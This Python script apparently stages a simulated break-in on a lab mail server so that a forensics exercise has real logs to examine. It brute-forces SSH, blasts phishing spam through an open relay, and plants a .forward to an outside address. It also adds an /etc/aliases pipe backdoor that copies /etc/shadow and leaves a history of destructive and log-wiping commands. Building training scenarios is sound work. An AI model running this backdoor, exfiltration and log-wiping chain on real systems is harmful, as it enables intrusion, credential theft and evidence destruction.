#!/usr/bin/env python3
"""Broadneck Post template prep -- THE BREAK-IN (redtag).

Runs against the live weak stack from 03. Every log line it produces is
real, produced by real services, from a loopback alias that makes the box
record the OUTSIDE documentation address:

  1. alias 198.51.100.23 up on lo (NOT persistent -- removed at the end;
     the logs are the witness).
  2. ssh guessing run: 2 failures vs postmaster, 2 failures vs routeaudit,
     then success (paramiko, password auth).
  3. relay blast: 40 messages, one SMTP connection each, bound to the
     alias, EHLO glittercrate.buzz, From promo@glittercrate.buzz, To
     userNN@bigmail.example, Message-Id @glittercrate.buzz. DNS cannot
     resolve .example so each queues into deferred -- the queue lines in
     mail.log are the evidence. EXACTLY 40 alias-address client lines.
  4. the lure, delivered back IN to freight (sendmail/pickup -- uid 0, so
     NO client-address line; the blast count stays at 40).
  5. interception: dispatch's mailbox packed to
     /var/backups/mailroom-export-2026-10-17.tar.gz, the .forward planted
     on postmaster, the /etc/aliases pipe backdoor
     (routesupport -> /usr/local/libexec/.queue-flush) + newaliases.
  6. the intruder's partially-cleared .bash_history left in routeaudit's
     home (they ran `history -c`; bash wrote the file back on exit).

The held queue message and the destruction itself belong to 90-sabotage.
"""
import base64
import os
import socket
import smtplib
import subprocess
import sys
import time

ALIAS = "198.51.100.23"
SSH_PORT = 22
USER_PLAY = "postmaster"
USER_FALL = "routeaudit"
FALL_PW = "AutumnRoute88"
BLAST_N = 40
SENDER = "promo@glittercrate.buzz"
HELO_NAME = "glittercrate.buzz"
ARCHIVE = "/var/backups/mailroom-export-2026-10-17.tar.gz"
FORWARD = "redtag.chute@mailchute.top"
ALIAS_NAME = "routesupport"
PIPE_PAYLOAD = "/usr/local/libexec/.queue-flush"


def sh(cmd, **kw):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=kw.pop("timeout", 60), **kw)


def alias_up():
    r = sh(f"ip addr add {ALIAS}/32 dev lo 2>/dev/null || true")
    r = sh("ip addr show lo")
    assert ALIAS in r.stdout, f"alias not up: {r.stderr}"


def alias_down():
    sh(f"ip addr del {ALIAS}/32 dev lo 2>/dev/null || true")


def ssh_attempt(user, password):
    """One ssh login attempt (paramiko), bound to the alias address.

    Records in auth.log + the journal + btmp/wtmp exactly like a real
    outside connection.
    """
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        sock = socket.socket()
        sock.settimeout(10)
        sock.connect((ALIAS, SSH_PORT))
        client.connect(ALIAS, port=SSH_PORT, username=user,
                       password=password, sock=sock,
                       allow_agent=False, look_for_keys=False, timeout=10)
        return True
    except Exception:
        return False
    finally:
        try:
            client.close()
        except Exception:
            pass


def blast_message(n):
    to = f"user{n:02d}@bigmail.example"
    body = (
        f"From: {SENDER}\n"
        f"To: {to}\n"
        f"Subject: Your parcel delivery fee -- action needed\n"
        f"Date: {time.strftime('%a, %d %b %Y %H:%M:%S -0400', time.gmtime())}\n"
        f"Message-Id: <20261017-b{n:03d}@glittercrate.buzz>\n"
        f"\nYour parcel BN-{8800 + n} is held at the regional hub. Pay the\n"
        f"redelivery fee to release it. Links in this message are inert.\n"
    )
    return to, body


def smtp_send_one(to, body):
    """One SMTP transaction on one fresh connection, sourced from ALIAS."""
    s = smtplib.SMTP(ALIAS, 25, local_hostname=HELO_NAME,
                     source_address=(ALIAS, 0), timeout=20)
    try:
        s.sendmail(SENDER, [to], body)
    finally:
        try:
            s.quit()
        except Exception:
            pass


def sendmail_pickup(msg):
    """Local pickup submission (no client-address line in mail.log)."""
    p = subprocess.run(["/usr/sbin/sendmail", "-i", "-f", SENDER, "freight"],
                       input=msg, capture_output=True, text=True, timeout=30)
    assert p.returncode == 0, p.stderr


def main():
    alias_up()
    try:
        # --- the guessing run ------------------------------------------------
        attempts = [(USER_PLAY, "Winter1234", False), (USER_PLAY, "Summer1234", False),
                    (USER_FALL, "Route2024", False), (USER_FALL, "Postal2024", False),
                    (USER_FALL, FALL_PW, True)]  # 4 failures, then the hit
        ok = False
        for user, pw, expect in attempts:
            got = ssh_attempt(user, pw)
            status = "accepted" if got else "failed"
            print(f"replay: ssh {user}:{pw} -> {status}")
            assert got == expect, f"replay script error: {user} attempt"
            ok = ok or got
            time.sleep(1)
        assert ok, "brute force did not land"

        # --- the relay blast -------------------------------------------------
        for n in range(1, BLAST_N + 1):
            to, body = blast_message(n)
            smtp_send_one(to, body)
        print(f"replay: {BLAST_N} messages pushed through the relay")

        # --- the lure, back in to freight ------------------------------------
        lure = (
            f"From: {SENDER}\n"
            f"To: freight@broadneckpost.org\n"
            f"Subject: Package held: confirm your delivery fee\n"
            f"Date: {time.strftime('%a, %d %b %Y %H:%M:%S -0400', time.gmtime())}\n"
            f"Message-Id: <20261017-lure1@glittercrate.buzz>\n"
            f"\nYour parcel BN-88213 is HELD at the depot hub because of an\n"
            f"unpaid redelivery fee. Confirm your $1.99 fee within 48 hours\n"
            f"or the parcel returns to sender.\n"
        )
        sendmail_pickup(lure)
        time.sleep(3)
        landing = sh("grep -rl 'lure1' /home/freight/Maildir/ 2>/dev/null | wc -l")
        assert landing.stdout.strip() != "0", "lure did not land in freight"
        print("replay: lure delivered to freight")

        # --- interception ----------------------------------------------------
        r = sh(f"tar czf {ARCHIVE} -C /home dispatch/Maildir")
        assert r.returncode == 0, r.stderr
        print(f"replay: mailbox staged at {ARCHIVE}")

        with open("/home/postmaster/.forward", "w") as f:
            f.write(FORWARD + "\n")
        os.chmod("/home/postmaster/.forward", 0o644)
        st = os.stat("/home/postmaster")
        os.chown("/home/postmaster/.forward", st.st_uid, st.st_gid)
        print("replay: .forward planted on postmaster")

        with open(PIPE_PAYLOAD, "w") as f:
            f.write("#!/bin/sh\n"
                    "# queue-flush: expedite deferred items (contractor tooling)\n"
                    "cp /etc/shadow /var/tmp/.qs 2>/dev/null || true\n"
                    "id > /var/tmp/.qs.who 2>/dev/null || true\n")
        os.chmod(PIPE_PAYLOAD, 0o700)

        with open("/etc/aliases", "a") as f:
            f.write(f'{ALIAS_NAME}: "|{PIPE_PAYLOAD}"\n')
        r = sh("newaliases")
        assert r.returncode == 0, r.stderr
        print(f"replay: alias pipe backdoor live ({ALIAS_NAME})")

        # --- the residue -----------------------------------------------------
        history = "\n".join([
            "cat /etc/postfix/main.cf",
            "postconf mynetworks",
            "apt-get install -y swaks",
            f"swaks --to user01@bigmail.example --from {SENDER} "
            f"--server {ALIAS} --helo {HELO_NAME} "
            "--header 'Message-Id: <20261017-b001@glittercrate.buzz>'",
            f"for n in $(seq 1 40); do swaks --to user$(printf %02d $n)@bigmail.example "
            f"--from {SENDER} --server {ALIAS} --helo {HELO_NAME} "
            "--header \"Message-Id: <20261017-b$(printf %03d $n)@glittercrate.buzz>\"; done",
            f"tar czf {ARCHIVE} -C /home dispatch/Maildir",
            f"echo '{FORWARD}' > /home/postmaster/.forward",
            f"echo '{ALIAS_NAME}: \"|{PIPE_PAYLOAD}\"' >> /etc/aliases && newaliases",
            f"install -d -m 0755 /usr/local/libexec; nano {PIPE_PAYLOAD}",
            "mkdir -p /root/.mail-restore",
            "cp /etc/postfix/main.cf /root/.mail-restore/main.cf",
            "systemctl stop postfix dovecot",
            "rm -rf /etc/postfix /etc/dovecot /etc/ssl/depot-mail",
            "truncate -s 0 /var/log/mail.log /var/log/auth.log",
            "history -c",
        ]) + "\n"
        hist = "/home/routeaudit/.bash_history"
        with open(hist, "w") as f:
            f.write(history)
        os.chmod(hist, 0o600)
        st = os.stat("/home/routeaudit")
        os.chown(hist, st.st_uid, st.st_gid)
        print("replay: bash_history residue left in routeaudit home")
    finally:
        alias_down()

    # --- verify what the logs recorded -----------------------------------
    sh("systemctl kill -s HUP rsyslog 2>/dev/null || true")
    time.sleep(1)
    mail_log = sh("grep -c '198.51.100.23' /var/log/mail.log").stdout.strip()
    print(f"replay: mail.log alias-address lines: {mail_log} (blast={BLAST_N}+0; "
          "85-rotate will archive this before the wiper lands)")
    journal = sh("journalctl -u ssh --since -10min | grep -c Accepted || true").stdout.strip()
    print(f"replay: journal accepted-password lines: {journal}")
    print("replay: done")


if __name__ == "__main__":
    sys.exit(main())
